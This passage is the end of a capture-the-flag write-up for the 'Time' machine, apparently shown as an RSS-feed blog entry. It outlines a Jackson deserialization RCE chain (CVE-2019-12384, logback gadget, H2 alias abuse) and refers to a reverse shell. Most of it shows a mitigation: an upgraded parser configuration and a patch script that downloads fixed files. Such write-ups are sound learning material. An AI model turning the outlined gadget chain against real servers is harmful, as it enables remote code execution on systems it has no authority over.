<span class="n">obj</span> <span class="o">=</span> <span class="n">mapper</span><span class="o">.</span><span class="n">readValue</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Object</span><span class="o">.</span><span class="n">java_class</span><span class="p">)</span> <span class="c1"># invokes all the setters</span>
<span class="nb">puts</span> <span class="s2">&#34;stringified: &#34;</span> <span class="o">+</span> <span class="n">mapper</span><span class="o">.</span><span class="n">writeValueAsString</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
</code></pre></div><p>The third condition is fulfilled by <code>logback-core-1.3.0-alpha5.jar</code> as the gadget class and <code>h2–1.4.199.jar</code> for the RCE capability. According to this <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">blog</a>, the H2 database alias feature can be abused. The researcher of CVE-2019–12384 abuses the alias feature to embed Java code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@time:/opt/json_project# grep -Ri version
Binary file classpath/h2-1.4.199.jar matches
Binary file classpath/jackson-databind-2.9.8.jar matches
Binary file classpath/logback-core-1.3.0-alpha5.jar matches
Binary file classpath/jackson-core-2.9.8.jar matches
</code></pre></div><h4 id="mitigation">Mitigation</h4>
<p>After I make sure there is no one currently exploiting the box, I tried to update the Jackson library to the v2.11 and also applied the new feature to mitigate the deserialization attack on the source code. Here is the updated version of <code>parse.rb</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;java&#39;</span>

<span class="no">Dir</span><span class="o">[</span><span class="s2">&#34;/opt/json_project/classpath/*.jar&#34;</span><span class="o">].</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span>
      <span class="nb">require</span> <span class="n">f</span>
<span class="k">end</span>

<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.ObjectMapper&#39;</span>
<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.SerializationFeature&#39;</span>
<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.MapperFeature&#39;</span> <span class="c1"># ==&gt; Mitigation v2.11 </span>
<span class="n">f</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">)</span>
<span class="n">content</span> <span class="o">=</span> <span class="n">f</span>
<span class="nb">puts</span> <span class="n">content</span>

<span class="n">mapper</span> <span class="o">=</span> <span class="no">ObjectMapper</span><span class="o">.</span><span class="n">new</span>
<span class="n">mapper</span><span class="o">.</span><span class="n">activateDefaultTyping</span><span class="p">()</span> <span class="c1"># ==&gt; Mitigation v2.10, enableDefaultTyping() to activateDefaultTyping() </span>
<span class="n">mapper</span><span class="o">.</span><span class="n">configure</span><span class="p">(</span><span class="no">MapperFeature</span><span class="o">::</span><span class="no">BLOCK_UNSAFE_POLYMORPHIC_BASE_TYPES</span><span class="p">);</span> <span class="c1"># ==&gt; Mitigation v2.11 </span>
<span class="n">mapper</span><span class="o">.</span><span class="n">configure</span><span class="p">(</span><span class="no">SerializationFeature</span><span class="o">::</span><span class="no">FAIL_ON_EMPTY_BEANS</span><span class="p">,</span> <span class="kp">false</span><span class="p">);</span>
<span class="n">obj</span> <span class="o">=</span> <span class="n">mapper</span><span class="o">.</span><span class="n">readValue</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Object</span><span class="o">.</span><span class="n">java_class</span><span class="p">)</span> <span class="c1"># invokes all the setters</span>
<span class="nb">puts</span> <span class="s2">&#34;stringified: &#34;</span> <span class="o">+</span> <span class="n">mapper</span><span class="o">.</span><span class="n">writeValueAsString</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
</code></pre></div><p>I also write a dirty script to patch it as well as to revert the patch, so I can perform a quick test. The script is supposed to be executed  from Time where the updated parser and the newer version of Jackson are  hosted from my machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
</span><span class="cp"></span><span class="c1"># ./time.sh patch [ip]</span>
<span class="nv">project_path</span><span class="o">=</span><span class="s2">&#34;/opt/json_project/&#34;</span>
<span class="nv">new_jackson</span><span class="o">=</span><span class="s2">&#34;jackson-core-2.11.0.jar&#34;</span>
<span class="nv">old_jackson</span><span class="o">=</span><span class="s2">&#34;jackson-core-2.9.8.jar&#34;</span>

<span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;patch&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
	<span class="c1"># backup the original code</span>
	mkdir -p /dev/shm/orig/
	mv <span class="nv">$project_path</span><span class="s2">&#34;classpath/&#34;</span><span class="nv">$old_jackson</span> /dev/shm/orig/
	mv <span class="nv">$project_path</span><span class="s2">&#34;parse.rb&#34;</span> /dev/shm/orig/
	
	<span class="c1"># These file hosted from my machine</span>
	curl -s <span class="s2">&#34;http://</span><span class="nv">$2</span><span class="s2">/</span><span class="nv">$new_jackson</span><span class="s2">&#34;</span> &gt; /tmp/<span class="nv">$new_jackson</span>
	curl -s <span class="s2">&#34;http://</span><span class="nv">$2</span><span class="s2">/parse.rb&#34;</span> &gt;  /tmp/parse.rb
	
	<span class="c1"># move the updated parser and jackson</span>
	cp /tmp/<span class="nv">$new_jackson</span> <span class="nv">$project_path</span><span class="s2">&#34;classpath/&#34;</span><span class="nv">$new_jackson</span> 
	cp /tmp/parse.rb <span class="s2">&#34;</span><span class="nv">$project_path</span><span class="s2">&#34;</span>
	chmod +x <span class="nv">$project_path</span><span class="s2">&#34;parse.rb&#34;</span>
	
<span class="k">elif</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;restore&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
	rm <span class="nv">$project_path</span><span class="s2">&#34;classpath/&#34;</span><span class="nv">$new_jackson</span>
	rm <span class="nv">$project_path</span><span class="s2">&#34;parse.rb&#34;</span>
	
	mv <span class="s2">&#34;/dev/shm/orig/</span><span class="nv">$old_jackson</span><span class="s2">&#34;</span> <span class="nv">$project_path</span><span class="s2">&#34;classpath/&#34;</span>
	mv <span class="s2">&#34;/dev/shm/orig/parse.rb&#34;</span> <span class="nv">$project_path</span>
	
	rm /tmp/<span class="nv">$new_jackson</span> 
	rm /tmp/parse.rb
	rm -r /dev/shm/orig/
	
<span class="k">fi</span>
</code></pre></div><p>I tried to exploit the validator again by reproducing the same steps as  in the Foothold section, but this time my reverse shell didn’t connect back. I checked the validator on the browser, and now it returned this  message.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Validation failed: WARNING: An illegal reflective access operation has occurred
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210509210620009.png" alt="image-20210509210620009"  /></div>
</p>
<p>Well, it is working, isn’t it?</p>
<hr>
<h2 id="references">References</h2>
<p>Exploitation:</p>
<ul>
<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">https://blog.doyensec.com/2019/07/22/jackson-gadgets.html</a></li>
<li><a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html</a></li>
</ul>
<p>Mitigation:</p>
<ul>
<li><a href="https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062">https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917">https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
